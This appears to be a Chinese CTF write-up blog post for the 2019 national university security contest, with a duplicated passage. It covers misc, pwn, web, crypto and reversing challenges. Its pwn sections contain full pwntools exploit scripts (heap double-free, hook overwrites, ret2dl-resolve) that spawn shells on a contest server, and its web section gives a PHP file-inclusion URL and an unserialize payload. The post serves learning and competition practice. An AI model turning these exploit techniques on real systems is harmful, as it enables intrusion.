((fake_sym_addr - dynsym) & 0xf) fake_sym_addr = fake_sym_addr + align\nindex_dynsym = (fake_sym_addr - dynsym) / 0x10\nr_info = index_dynsym << 8 | 0x7\nfake_reloc = p32(alarm_got) + p32(r_info)\nst_name = fake_sym_addr + 0x10 - dynstr\nfake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)\npayload = 'a'*0x28 + p32(bss_addr)\npayload += p32(read_plt) + p32(leave_ret) + p32(0) + p32(bss_addr) + p32(36)\n#raw_input(\"go:\")\np.send(payload)\n#fake stack 1 bss_addr\npayload1 = 'aaaa' #pop ebp\npayload1 += p32(read_plt) + p32(ppp_ret) + p32(0) + p32(base_stage) + p32(100) payload1 += p32(pop_ebp_ret) + p32(base_stage) #fake stack again\npayload1 += p32(leave_ret) #leave: mov esp,ebp; pop ebp\np.send(payload1)\ncmd = \"/bin/sh\"\n#fake stack 2 base_stage\npayload2 = 'bbbb'\npayload2 += p32(plt_0)\npayload2 += p32(index_offset)\npayload2 += 'aaaa'\npayload2 += p32(base_stage + 80)\npayload2 += 'aaaa'\npayload2 += 'aaaa'\npayload2 += fake_reloc #base_stage+28\npayload2 += 'b' * align\npayload2 += fake_sym #base_stage+36\npayload2 += \"system\\x00\"\npayload2 += 'a' * (80 - len(payload2))\npayload2 += cmd +'\\x00'\n#payload2 += 'a' * (100 - len(payload2))\nprint len(payload2)\nsleep(1)\np.sendline(payload2)\n#p.sendline(\"icq0030af22ece42d03523c08138525f\")\np.interactive()\n```\n![22](/img/2019-04-23/22.png)\n#### double\n![5](/img/2019-04-23/5.png)\n由于这个对比，只要输入的`data`相同则不会分配堆块给`data`，造成两个指针指向同一个`data`。只要申请两个相同内容大小为`smallbin`，`free`掉 一个指针，`show`另一个指针即可获得`libc`的地址。同理只要`free`掉其中一个，在对另一个相同指向的指针进行`edit`，就可以改变`fd`。将`fd`改成`malloc_hook`，再将`malloc_hook`的值改成`one_gadget`即可getshell。\n详细脚本如下：\n```python\nfrom pwn import *\n#context(os='linux',arch='amd64',aslr = 'False',log_level='debug')\nlocal = 0\nif local:\n\tp = process(\"./pwn\")\nelse:\n\tp = remote(\"39.97.228.196\",60004)\n\ndef create(content):\n\tp.recvuntil(\"> \")\n\tp.sendline(\"1\")\n\tsleep(0.1)\n\tp.sendline(content)\n\ndef show(index):\n\tp.recvuntil(\"> \")\n\tp.sendline(\"2\")\n\tp.recv()\n\tp.sendline(str(index))\n\ndef edit(index,content):\n\tp.recvuntil(\"> \")\n\tp.sendline(\"3\")\n\tp.recv()\n\tp.sendline(str(index))\n\tsleep(0.1)\n\tp.sendline(content)\n\ndef free(index):\n\tp.recvuntil(\"> \")\n\tp.sendline(\"4\")\n\tp.recv()\n\tp.sendline(str(index))\n\ndef exp(): \n\tcreate(\"1\"*0x60) #0\n\tcreate(\"1\"*0x60) #1\n\tcreate(\"2\"*0x60) #2\n\tcreate(\"3\"*0x80) #3\n\tcreate(\"3\"*0x80) #4\n\tfree(3)\n\tshow(4)\n\tif local:\n\t\tpass\n\telse:\n\t\tpass\n\t\t#p.recvuntil(\"Info index: \")\n\t\t#p.recvuntil(\"Info index: \")\n\tdata = u64(p.recvuntil(\"\\n\",drop=True)+\"\\x00\\x00\") libc_base = data - 0x3c4b78\n\tmalloc_hook = libc_base + 0x3c4b10\n\tone_shot = libc_base + 0xf02a4 print(\"malloc_hook = \" + str(hex(malloc_hook))) print(\"one_shot = \" + str(hex(one_shot))) free(1)\n\tfree(2)\n\tedit(0,p64(malloc_hook - 19))\n\tcreate(\"4\"*0x60)\n\tcreate(\"5\"*0x60)\n\tpayload = \"a\"*3 + p64(one_shot)\n\tpayload = payload.ljust(0x60,\"\\x00\")\n\tcreate(payload)\n\tcreate(\"icq0030af22ece42d03523c08138525f\")\n\tp.interactive()\nexp()\n```\n![6](/img/2019-04-23/6.png)\n### web\n#### justSoso\n`http://d466a1d4c1214b3181516b834f0de419f413fd793ae942d0.changame.ichunqiu.com/index.php?file=php://filter/read=convert.base64-encode/resource=index.php`\n通过文件包含拿到hint.php和index.php的源码\n```php\n//index.php\n<html>\n<?php\nerror_reporting(0); \n$file = $_GET[\"file\"]; \n$payload = $_GET[\"payload\"];\nif(!isset($file)){\n\techo 'Missing parameter'.'<br>';\n}\nif(preg_match(\"/flag/\",$file)){\n\tdie('hack attacked!!!');\n}\n@include($file);\nif(isset($payload)){  \n    $url = parse_url($_SERVER['REQUEST_URI']);\n    parse_str($url['query'],$query);\n    foreach($query as $value){\n        if (preg_match(\"/flag/\",$value)) { \n    \t    die('stop hacking!');\n    \t    exit();\n        }\n    }\n    $payload = unserialize($payload);\n}else{ \n   echo \"Missing parameters\"; \n} \n?>\n<!--Please test index.php?file=xxx.php -->\n<!--Please get the source of hint.php-->\n</html>\n\n//hint.php\n<?php  \nclass Handle{ \n    private $handle;  \n    public function __wakeup(){\n\t\tforeach(get_object_vars($this) as $k => $v) {\n            $this->$k = null;\n        }\n        echo \"Waking up\\n\";\n    }\n\tpublic function __construct($handle) { \n        $this->handle = $handle; \n    } \n\tpublic function __destruct(){\n\t\t$this->handle->getFlag();\n\t}\n}\n\nclass Flag{\n    public $file;\n    public $token;\n    public $token_flag;\n \n    function __construct($file){\n\t\t$this->file = $file;\n\t\t$this->token_flag = $this->token = md5(rand(1,10000));\n    }\n    \n\tpublic function getFlag(){\n\t\t$this->token_flag = md5(rand(1,10000));\n        if($this->token === $this->token_flag)\n\t\t{\n\t\t\tif(isset($this->file)){\n\t\t\t\techo @highlight_file($this->file,true); \n            }  \n        }\n    }\n}\n?\n```\nparse_url存在绕过的漏洞，例如：`http://127.0.0.1///index.php`\n构造payload\n```php\n<?php\nclass Handle{\n    private $handle;\n\n\n    public function __construct($handle) {\n        $this->handle = $handle;\n\n\n    }\n    public function __destruct(){\n        $this->handle->getFlag();\n    }\n}\n\n\nclass Flag{\n    public $file;\n    function __construct($file){\n        $this->file = $file;\n    }\n    public function getFlag(){\n        if(isset($this->file)){\n            echo @highlight_file($this->file,true);\n        }\n    }\n}\n\n$flag = new Flag('flag.php');\n$flag ->token = &$flag -> token_flag;\n$exp = new Handle($flag);\necho urlencode(serialize($exp)).PHP_EOL;\n?>\n```\n得到以下payload\n```\nO%3A6%3A%22Handle%22%3A1%3A%7Bs%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A10%3A%22token_flag%22%3BN%3Bs%3A5%3A%22token%22%3BR%3A4%3B%7D%7D\n\nurldecode:\nO:6:\"Handle\":1:{s:14:\".Handle.handle\";O:4:\"Flag\":3:{s:4:\"file\";s:8:\"flag.php\";s:10:\"token_flag\";N;s:5:\"token\";R:4;}}\n```\n还要把一个的1改为2，不然会跳进Waking up函数\n```\nO%3A6%3A%22Handle%22%3A2%3A%7Bs%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A10%3A%22token_flag%22%3BN%3Bs%3A5%3A%22token%22%3BR%3A4%3B%7D%7D\n\nurldecode:\nO:6:\"Handle\":2:{s:14:\".Handle.handle\";O:4:\"Flag\":3:{s:4:\"file\";s:8:\"flag.php\";s:10:\"token_flag\";N;s:5:\"token\";R:4;}}\n```\n![8](/img/2019-04-23/8.png)\n### crypto\n#### puzzle\n##### question-0\n![10](/img/2019-04-23/10.png)\n```\na1:0xfa6\n\na2:0xbed\n\na3:0x9c7\n\na4:0xa00\n```\n##### part1\n看到这三个数都是素数，猜想part1也可能是素数。google到如下的素数表\n![11](/img/2019-04-23/11.png)\n猜测part1所在位置，根据素数之间的间隔相等的原则，猜出part1为26365399\n##### part2\n![12](/img/2019-04-23/12.png)\n脚本也可解：\n```python\nimport sympy as sy\nx = sy.symbols('x')\nprint(sy.integrate(sy.exp(x)*pow(4 + sy.exp(x),2), (x, float(0), sy.log(2)))) \nrerult : 30.3333333333333\n(1+30.3333333≈9*31+7+1)=100\npart2 = （1+91+7+1）*77 =7700\nhex(7700)=0x1e14\n```\n##### part3\n![13](/img/2019-04-23/13.png)\n![14](/img/2019-04-23/14.png)\npart3 = 0x48d0\n##### part4\n![15](/img/2019-04-23/15.png)\n![16](/img/2019-04-23/16.png)\npart 4 =hex(40320)=0x9d80\n#### warmup\n本题是AES_CTR加密，而这个加密方式就是分组对明文进行异或，因为在同一次通信中其中的key和计数器不变，所以明文异或的密钥不会变，因此我们可以在通信过程可以通过输入不同的填充获得密钥。经过测试可以发现，32 个一个分组，flag有两个分组多一些，可以先填充5个让flag加填充满足有3_32个，得到第一个需要的密文data1，然后填充5+48获得第二个密文，第二个密文(data2)有6_32个bit。\n则详细脚本如下：\n```python\ndata1 = \"aefdd88c71194ba242a1e45c7a03f1e8715e11c3566607ee614c8cd4541f3688f0e5a35146b5cca393c8432dafdccee7\" \n\ndata2 = \"aefdd88c711e46a244bbbc0d2d51f1bb26085d90026603a234188c86184734dff4a9f40244e4c8a0c3cd407eab84d287ec9ece135f9a2a6bc7d427cd18e7c7995985df9d61d1b697d5472b073c27a6b0d5245917d3b1965248a6c228d6f260d4\"\ns1 = [data1[0:32],data1[32:32*2],data1[32*2:32*3]]\ns2 = [data2[0:32],data2[32:32*2],data2[32*2:32*3],data2[32*3:32*4],data2[32*4:32*5], data2[32*5:32*6]]\nming=\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"\nminghex=ming.encode(\"hex\")\nkey1=int(s1[0],16)^int(minghex,16)\nkey2=int(s1[1],16)^int(minghex,16)\nkey3=int(s1[2],16)^int(minghex,16)\nminghex0=int(s2[0],16)^key1\nminghex1=int(s2[1],16)^key2\nminghex2=int(s2[2],16)^key3\nprint hex(minghex0)[2:-1].decode(\"hex\")\nprint hex(minghex1)[2:-1].decode(\"hex\")\nprint hex(minghex2)[2:-1].decode(\"hex\")\n```\n![17](/img/2019-04-23/17.png)\n#### Asymmetric\n看了一 下题目给的脚本，其实就是普通的RSA题 ,主要还是把**n**分解\n![18](/img/2019-04-23/18.png)\n剩下就 很简单了\n![19](/img/2019-04-23/19.png)\n### Re\n#### EasyGo\n查看可执行文件格式\n![20](/img/2019-04-23/20.png)\n程序为Go语言编写,内部函数较为复杂，直接IDA动态调试，定位到`sub_495150`函数，执行完`sub_4886B0`,程序打印了字符串\n![21](/img/2019-04-23/21.png)\n在`sub_48EB00`中, 程序调用了输入函数，继续执行，发现函数将一串字符串地址放到了`rax`，并在接下来的几个`CALL`中，对其进行了一些操作，这里没有仔细跟进，由于在`sub_47E620`函数处存在跳转,猜测这里可能为相关的`check`函数，重点关注其所对应的内存区域，可发现，执行完`sub_47E620`函数后,可以在内存中直接拿到flag","source":"_posts/2019-04-23-guosaiwp.md","raw":"---\ntitle: 第十二届全国大学生信息安全竞赛初赛writeup\nindex_img: /img/2019-04-23/index.jpg\ndate: 2019-04-23 20:32:52\ntags:\n- writeup\n- misc\n- crypto\n- web\n- ctf\n- pwn\n- 国赛\n---\n大佬的博客–>[传送门](https://www.ctfwp.com/articals/2019national.html)\n<!--more-->\n\n### misc\n#### 签到\n摄像头捕捉到三个人的脸即可\n### saleae\n下载回来一个`saleae.logicdata`文件，经搜索发现这个saleae的可以打开的文件类型，官网地址–>[传送门](https://www.saleae.com/zh/)，打开文件只发现一些波形\n![1](/img/2019-04-23/1.png)\n网上搜索资料看到一篇教程通过xor两条数据流得到信息，上面一条是当上面波形的电平为高电平且下面那条也是高电平时为1，下面那条是低电平则为0，如图\n![2](/img/2019-04-23/2.png)\n最后得到一串数据\n```\n011001100110110001100001011001110111101100110001001100100011000000110111001100010011001100111001001101110010110100110001001110010110010000110001001011010011010000111000011001010011011000101101011000100110010100111000011000110010110100110111001110000011010001100010001110000011100101100001001110010011010101100101001100000011011101111101\n```\n8个一组得到flag\n#### usbasp\n打开文件后在`analyzer`里选择`SPI`，设置选项最下面选择`enable line is active hight`\n![7](/img/2019-04-23/7.png)\n右下面可以明显看到flag导出即可\n![9](/img/2019-04-23/9.png)\n### pwn\n#### your-pwn\n在函数`sub_B35`里面，没有对`index(v1)`进行检查，从而造成任意地址泄露和任意地址更改。直接改返回地址为`one_gadget`即可\n```\nfor ( i = 0; i <= 40; ++i )\n{\nputs(\"input index\");\n__isoc99_scanf(\"%d\", &v1);\nprintf(\"now value(hex) %x\\n\", (unsigned int)v4[v1]);\nputs(\"input new value\");\n__isoc99_scanf(\"%d\", &v2);\nv4[v1] = v2;\n}\n```\n详细脚本如下：\n```python\nfrom pwn import *\n#context(os='linux',arch='amd64',aslr = 'False',log_level='debug')\nlocal = 0\nif local:\n\tp = process(\"./pwn\")\nelse:\n\tp = remote(\"39.97.228.196\",60007)\ndef pass_():\n\tp.recvuntil(\"name\")\n\tp.sendline(\"Team233\")\ndef change(index, addr):\n\tfor i in range(8):\n\t\tp.recvuntil(\"index\\n\")\n\t\tp.sendline(str(index+i))\n\t\tp.recvuntil(\"now value(hex) \")\n\t\tdata = p.recvn(1)\n\t\t#print(\"data = \" + str(data))\n\t\tp.recvuntil(\"input new value\\n\")\n\t\tp.sendline(str(addr))\n\t\taddr = addr >> 8\ndef leak(index):\n\taddr = \"\"\n\tfor i in range(8):\n\t\tp.recvuntil(\"index\\n\")\n\t\tp.sendline(str(index+i))\n\t\tp.recvuntil(\"now value(hex) \")\n\t\tdata = int(p.recvuntil(\"\\n\",drop=True),16)\n\t\tif data > 300:\n\t\t\tdata = data - 0xffffff00\n\t\tp.recvuntil(\"input new value\\n\")\n\t\tp.sendline(str(data))\n\t\taddr += chr(data)\n\taddr = u64(addr)\n\treturn addr\ndef exp():\n\tpass_()\n\t#gdb.attach(p)addr = leak(0x158)\n\telf_base = addr - 0xb11\n\tprint '[*] elf_base :',hex(elf_base)\n\taddr = leak(0x160+0x118)\n\tlibc_base = addr - 0x20830\n\tone_shot = libc_base + 0xf02a4\n\tprint '[*] one_shot :',hex(one_shot)\n\tprint '[*] libc_base :',hex(libc_base)\n\tpause()\n\tchange(0x158,one_shot)\n\tp.sendline(\"no\")\n\tp.sendline(\"cat flag\")\n\tp.interactive()\nexp()\n```\n![3](/img/2019-04-23/3.png)\n#### daily\n由于是`%s`打印内 容，会一直打印遇到`\\x00`才会停止，而且`add`的时候通过`read`读入没有写入字符串后缀，所以可以利用这一点可以泄露`libc`地址和`heap`地址。泄露利用如下：\n```\ncreate(0x60,\"a\"*0x20)#0\ncreate(0x60,\"a\"*0x20)#1\ncreate(0x60,\"b\"*0x20)#2\ndelete(0)\ndelete(1)\ncreate(0x60,\"a\")#0\nshow()\np.recvuntil(\"0 : a\")\ndata = \"\\x00\"+p.recvuntil(\"2\",drop=True)\nheap = u64(data.ljust(8,\"\\x00\"))\nprint \"[*]heap : \", hex(heap)\ncreate(0x100,\"a\"*0x20)#1 \ncreate(0x100,\"a\"*0x20)#3 \ndelete(1)\ncreate(0x20,\"a\"*0x20)#1\ncreate(0xd0,\"a\"*8)#4\nshow()\np.recvuntil(\"4 : aaaaaaaa\")\ndata = p.recvn(6) + \"\\x00\\x00\"\nlibc_base = u64(data) - 0x3c4b78\n```\n然后利用`free`的时候没有检查`index(v1)`，漏洞点如下程序部分代码，造成`UAF`分配到`bss`上的`chunk_list`，然后改`free`就可以了 。\n```\nprintf(\"Please enter the index of daily:\");\nread(0, &buf, 8uLL);\nv1 = atoi(&buf);\nif ( chunk[v1].ptr )\n{\nfree((void *)chunk[v1].ptr);\nchunk[v1].ptr = 0LL;\nLODWORD(chunk[v1].len) = 0;\nputs(\"remove successful!!\");\n--chunk_num;\n}\n```\n然后利用`Double free`得到`bss`段上的`chunk_list`,然后控制`chunk`，实现任意地址写，然后我们写`free_hook`地址为`system`，再`free`的时候就可以`getshell`了。在这之前，我们尝试了申请到`malloc_hook`前面然后把`malloc_hoook`覆盖为`one_gadget`，但是没有一个`one_gadget`可以成功，主要是因为条件没有满足，后来就直接`free_hook`了。详细脚本如下：\n```python\nfrom pwn import *\n#context(os='linux',arch='amd64',aslr = 'False',log_level='debug')\nlocal = 0\nif local:\n\tp = process(\"./pwn\")\nelse:\n\tp = remote(\"39.97.228.196\",60006)\n\ndef show():\n\tp.recvuntil(\":\")\n\tp.sendline(\"1\") \n\ndef create(lens,content):\n\tp.recvuntil(\":\")\n\tp.sendline(\"2\") \n\tp.recvuntil(\":\")\n\tp.sendline(str(lens)) \n\tp.recv()\n\tp.send(content)\n\ndef change(index,content):\n\tp.recvuntil(\":\")\n\tp.sendline(\"3\") \n\tp.recvuntil(\":\")\n\tp.sendline(str(index)) \n\tp.recv()\n\tp.send(content)\n\ndef delete(index):\n\tp.recvuntil(\":\")\n\tp.sendline(\"4\") \n\tp.recvuntil(\":\")\n\tp.sendline(str(index)) \nchunk_list = 0x602060\n\ndef exp(): \n\tcreate(0x60,\"a\"*0x20)#0\n\tcreate(0x60,\"a\"*0x20)#1\n\tcreate(0x60,\"b\"*0x20)#2\n\tdelete(0)\n\tdelete(1)\n\tcreate(0x60,\"a\")#0\n\tshow()\n\tp.recvuntil(\"0 : a\")\n\tdata = \"\\x00\"+p.recvuntil(\"2\",drop=True)\n\theap = u64(data.ljust(8,\"\\x00\"))\n\tprint \"[*]heap : \", hex(heap)\n\tcreate(0x100,\"a\"*0x20)#1\n\tcreate(0x100,\"a\"*0x20)#3\n\tdelete(1)\n\tcreate(0x20,\"a\"*0x20)#1\n\tcreate(0xd0,\"a\"*8)#4\n\tshow()\n\tp.recvuntil(\"4 : aaaaaaaa\")\n\tdata = p.recvn(6) + \"\\x00\\x00\"\n\tlibc_base = u64(data) - 0x3c4b78\n\tmalloc_hook = libc_base + 0x3c4b10\n\tone_shot = libc_base + 0xf02a4\n\tfree_hook = libc_base + 0x3c67a8\n\tsystem = libc_base + 0x45390\n\tprint '[*]libc_base : ',hex(libc_base)\n\tprint '[*]malloc_hook : ',hex(malloc_hook)\n\tprint '[*]free_hook : ',hex(free_hook)\n\tprint '[*]one_shot : ',hex(one_shot)\n\tprint '[*]system : ',hex(system)\n\tindex = (heap - chunk_list + 8)/0x10 + 15\n\tprint '[*]index : ',hex(index)\n\tchange(2,\"a\"*8+p64(heap+0x10))\n\tcreate(0x71,\"h\"*0x71)#5\n\tcreate(0x60,\"e\"*0x60) #6\n\tcreate(0x60,\"b\"*0x60) #7\n\t#gdb.attach(p)\n\tdelete(6)\n\tdelete(7)\n\tdelete(index)\n\tcreate(0x60,p64(0x6020a8)) #6\n\tcreate(0x60,\"c\"*0x60) #7\n\tcreate(0x60,\"/bin/sh\\x00\") #8\n\tpayload = p64(free_hook) + p64(0x20) + p64(heap+0x10) payload = payload.ljust(0x60,\"\\x00\")\n\tcreate(0x60, payload) #9\n\tshow()\n\tchange(5,p64(system))\n\tdelete(6)\n\tp.recv()\n\t#gdb.attach(p)\n\tp.interactive() \n\nexp()\n```\n最后成功 getshell\n![4](/img/2019-04-23/4.png)\n#### babypwn\n直接`read`读入`0x100`直接造成栈溢出，但是这题的难点在于没有泄露函数，不能直接`return to libc`，所以这里利用`ret2_dl_runtime_resolve`，之前做过0ctf2018的babystack 跟这个类似，先是尝试了`roputils`库实现，后来发现有点问题总是调不对，后来直接手工干了一波。操作如下：\n```python\n# -*- coding:utf-8 -*-\nfrom pwn import *\ncontext.log_level = 'debug'\n#p = process('./pwn')\np = remote(ip,port)\nelf = ELF('./pwn')\nread_plt = elf.plt['read']\nalarm_plt = elf.plt['alarm']\npop_ebp_ret = 0x080485db\nppp_ret = 0x080485d9\npp_ebp_ret = 0x080485da\nleave_ret = 0x08048448\nstack_size = 0x800\nbss_addr = 0x0804a040 #readelf -S babystack | grep \".bss\" base_stage = bss_addr + stack_size\nplt_0 = 0x8048380 # objdump -d -j .plt babystack\nrel_plt = 0x804833c # objdump -s -j .rel.plt babystack index_offset = (base_stage + 28) - rel_plt\nalarm_got = elf.got['alarm']\nprint \"alarm_got: \",hex(alarm_got)\nprint \"alarm_plt: \",hex(alarm_plt)\nprint \"read_plt: \",hex(read_plt)\ndynsym = 0x80481DC\ndynstr = 0x804827C\nfake_sym_addr = base_stage + 36\nalign = 0x10 - ((fake_sym_addr - dynsym) & 0xf) fake_sym_addr = fake_sym_addr + align\nindex_dynsym = (fake_sym_addr - dynsym) / 0x10\nr_info = index_dynsym << 8 | 0x7\nfake_reloc = p32(alarm_got) + p32(r_info)\nst_name = fake_sym_addr + 0x10 - dynstr\nfake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)\npayload = 'a'*0x28 + p32(bss_addr)\npayload += p32(read_plt) + p32(leave_ret) + p32(0) + p32(bss_addr) + p32(36)\n#raw_input(\"go:\")\np.send(payload)\n#fake stack 1 bss_addr\npayload1 = 'aaaa' #pop ebp\npayload1 += p32(read_plt) + p32(ppp_ret) + p32(0) + p32(base_stage) + p32(100) payload1 += p32(pop_ebp_ret) + p32(base_stage) #fake stack again\npayload1 += p32(leave_ret) #leave: mov esp,ebp; pop ebp\np.send(payload1)\ncmd = \"/bin/sh\"\n#fake stack 2 base_stage\npayload2 = 'bbbb'\npayload2 += p32(plt_0)\npayload2 += p32(index_offset)\npayload2 += 'aaaa'\npayload2 += p32(base_stage + 80)\npayload2 += 'aaaa'\npayload2 += 'aaaa'\npayload2 += fake_reloc #base_stage+28\npayload2 += 'b' * align\npayload2 += fake_sym #base_stage+36\npayload2 += \"system\\x00\"\npayload2 += 'a' * (80 - len(payload2))\npayload2 += cmd +'\\x00'\n#payload2 += 'a' * (100 - len(payload2))\nprint len(payload2)\nsleep(1)\np.sendline(payload2)\n#p.sendline(\"icq0030af22ece42d03523c08138525f\")\np.interactive()\n```\n![22](/img/2019-04-23/22.png)\n#### double\n![5](/img/2019-04-23/5.png)\n由于这个对比，只要输入的`data`相同则不会分配堆块给`data`，造成两个指针指向同一个`data`。只要申请两个相同内容大小为`smallbin`，`free`掉 一个指针，`show`另一个指针即可获得`libc`的地址。同理只要`free`掉其中一个，在对另一个相同指向的指针进行`edit`，就可以改变`fd`。将`fd`改成`malloc_hook`，再将`malloc_hook`的值改成`one_gadget`即可getshell。\n详细脚本如下：\n```python\nfrom pwn import *\n#context(os='linux',arch='amd64',aslr = 'False',log_level='debug')\nlocal = 0\nif local:\n\tp = process(\"./pwn\")\nelse:\n\tp = remote(\"39.97.228.196\",60004)\n\ndef create(content):\n\tp.recvuntil(\"> \")\n\tp.sendline(\"1\")\n\tsleep(0.1)\n\tp.sendline(content)\n\ndef show(index):\n\tp.recvuntil(\"> \")\n\tp.sendline(\"2\")\n\tp.recv()\n\tp.sendline(str(index))\n\ndef edit(index,content):\n\tp.recvuntil(\"> \")\n\tp.sendline(\"3\")\n\tp.recv()\n\tp.sendline(str(index))\n\tsleep(0.1)\n\tp.sendline(content)\n\ndef free(index):\n\tp.recvuntil(\"> \")\n\tp.sendline(\"4\")\n\tp.recv()\n\tp.sendline(str(index))\n\ndef exp(): \n\tcreate(\"1\"*0x60) #0\n\tcreate(\"1\"*0x60) #1\n\tcreate(\"2\"*0x60) #2\n\tcreate(\"3\"*0x80) #3\n\tcreate(\"3\"*0x80) #4\n\tfree(3)\n\tshow(4)\n\tif local:\n\t\tpass\n\telse:\n\t\tpass\n\t\t#p.recvuntil(\"Info index: \")\n\t\t#p.recvuntil(\"Info index: \")\n\tdata = u64(p.recvuntil(\"\\n\",drop=True)+\"\\x00\\x00\") libc_base = data - 0x3c4b78\n\tmalloc_hook = libc_base + 0x3c4b10\n\tone_shot = libc_base + 0xf02a4 print(\"malloc_hook = \" + str(hex(malloc_hook))) print(\"one_shot = \" + str(hex(one_shot))) free(1)\n\tfree(2)\n\tedit(0,p64(malloc_hook - 19))\n\tcreate(\"4\"*0x60)\n\tcreate(\"5\"*0x60)\n\tpayload = \"a\"*3 + p64(one_shot)\n\tpayload = payload.ljust(0x60,\"\\x00\")\n\tcreate(payload)\n\tcreate(\"icq0030af22ece42d03523c08138525f\")\n\tp.interactive()\nexp()\n```\n![6](/img/2019-04-23/6.png)\n### web\n#### justSoso\n`http://d466a1d4c1214b3181516b834f0de419f413fd793ae942d0.changame.ichunqiu.com/index.php?file=php://filter/read=convert.base64-encode/resource=index.php`\n通过文件包含拿到hint.php和index.php的源码\n```php\n//index.php\n<html>\n<?php\nerror_reporting(0); \n$file = $_GET[\"file\"]; \n$payload = $_GET[\"payload\"];\nif(!isset($file)){\n\techo 'Missing parameter'.'<br>';\n}\nif(preg_match(\"/flag/\",$file)){\n\tdie('hack attacked!!!');\n}\n@include($file);\nif(isset($payload)){  \n    $url = parse_url($_SERVER['REQUEST_URI']);\n    parse_str($url['query'],$query);\n    foreach($query as $value){\n        if (preg_match(\"/flag/\",$value)) { \n    \t    die('stop hacking!');\n    \t    exit();\n        }\n    }\n    $payload = unserialize($payload);\n}else{ \n   echo \"Missing parameters\"; \n} \n?>\n<!--Please test index.php?file=xxx.php -->\n<!--Please get the source of hint.php-->\n</html>\n\n//hint.php\n<?php  \nclass Handle{ \n    private $handle;  \n    public function __wakeup(){\n\t\tforeach(get_object_vars($this) as $k => $v) {\n            $this->$k = null;\n        }\n        echo \"Waking up\\n\";\n    }\n\tpublic function __construct($handle) { \n        $this->handle = $handle; \n    } \n\tpublic function __destruct(){\n\t\t$this->handle->getFlag();\n\t}\n}\n\nclass Flag{\n    public $file;\n    public $token;\n    public $token_flag;\n \n    function __construct($file){\n\t\t$this->file = $file;\n\t\t$this->token_flag = $this->token = md5(rand(1,10000));\n    }\n    \n\tpublic function getFlag(){\n\t\t$this->token_flag = md5(rand(1,10000));\n        if($this->token === $this->token_flag)\n\t\t{\n\t\t\tif(isset($this->file)){\n\t\t\t\techo @highlight_file($this->file,true); \n            }  \n        }\n    }\n}\n?\n```\nparse_url存在绕过的漏洞，例如：`http://127.0.0.1///index.php`\n构造payload\n```php\n<?php\nclass Handle{\n    private $handle;\n\n\n    public function __construct($handle) {\n        $this->handle = $handle;\n\n\n    }\n    public function __destruct(){\n        $this->handle->getFlag();\n    }\n}\n\n\nclass Flag{\n    public $file;\n    function __construct($file){\n        $this->file = $file;\n    }\n    public function getFlag(){\n        if(isset($this->file)){\n            echo @highlight_file($this->file,true);\n        }\n    }\n}\n\n$flag = new Flag('flag.php');\n$flag ->token = &$flag -> token_flag;\n$exp = new Handle($flag);\necho urlencode(serialize($exp)).PHP_EOL;\n?>\n```\n得到以下payload\n```\nO%3A6%3A%22Handle%22%3A1%3A%7Bs%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A10%3A%22token_flag%22%3BN%3Bs%3A5%3A%22token%22%3BR%3A4%3B%7D%7D\n\nurldecode:\nO:6:\"Handle\":1:{s:14:\".Handle.handle\";O:4:\"Flag\":3:{s:4:\"file\";s:8:\"flag.php\";s:10:\"token_flag\";N;s:5:\"token\";R:4;}}\n```\n还要把一个的1改为2，不然会跳进Waking up函数\n```\nO%3A6%3A%22Handle%22%3A2%3A%7Bs%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A10%3A%22token_flag%22%3BN%3Bs%3A5%3A%22token%22%3BR%3A4%3B%7D%7D\n\nurldecode:\nO:6:\"Handle\":2:{s:14:\".Handle.handle\";O:4:\"Flag\":3:{s:4:\"file\";s:8:\"flag.php\";s:10:\"token_flag\";N;s:5:\"token\";R:4;}}\n```\n![8](/img/2019-04-23/8.png)\n### crypto\n#### puzzle\n##### question-0\n![10](/img/2019-04-23/10.png)\n```\na1:0xfa6\n\na2:0xbed\n\na3:0x9c7\n\na4:0xa00\n```\n##### part1\n看到这三个数都是素数，猜想part1也可能是素数。google到如下的素数表\n![11](/img/2019-04-23/11.png)\n猜测part1所在位置，根据素数之间的间隔相等的原则，猜出part1为26365399\n##### part2\n![12](/img/2019-04-23/12.png)\n脚本也可解：\n```python\nimport sympy as sy\nx = sy.symbols('x')\nprint(sy.integrate(sy.exp(x)*pow(4 + sy.exp(x),2), (x, float(0), sy.log(2)))) \nrerult : 30.3333333333333\n(1+30.3333333≈9*31+7+1)=100\npart2 = （1+91+7+1）*77 =7700\nhex(7700)=0x1e14\n```\n##### part3\n![13](/img/2019-04-23/13.png)\n![14](/img/2019-04-23/14.png)\npart3 = 0x48d0\n##### part4\n![15](/img/2019-04-23/15.png)\n![16](/img/2019-04-23/16.png)\npart 4 =hex(40320)=0x9d80\n#### warmup\n本题是AES_CTR加密，而这个加密方式就是分组对明文进行异或，因为在同一次通信中其中的key和计数器不变，所以明文异或的密钥不会变，因此我们可以在通信过程可以通过输入不同的填充获得密钥。经过测试可以发现，32 个一个分组，flag有两个分组多一些，可以先填充5个让flag加填充满足有3_32个，得到第一个需要的密文data1，然后填充5+48获得第二个密文，第二个密文(data2)有6_32个bit。\n则详细脚本如下：\n```python\ndata1 = \"aefdd88c71194ba242a1e45c7a03f1e8715e11c3566607ee614c8cd4541f3688f0e5a35146b5cca393c8432dafdccee7\" \n\ndata2 = \"aefdd88c711e46a244bbbc0d2d51f1bb26085d90026603a234188c86184734dff4a9f40244e4c8a0c3cd407eab84d287ec9ece135f9a2a6bc7d427cd18e7c7995985df9d61d1b697d5472b073c27a6b0d5245917d3b1965248a6c228d6f260d4\"\ns1 = [data1[0:32],data1[32:32*2],data1[32*2:32*3]]\ns2 = [data2[0:32],data2[32:32*2],data2[32*2:32*3],data2[32*3:32*4],data2[32*4:32*5], 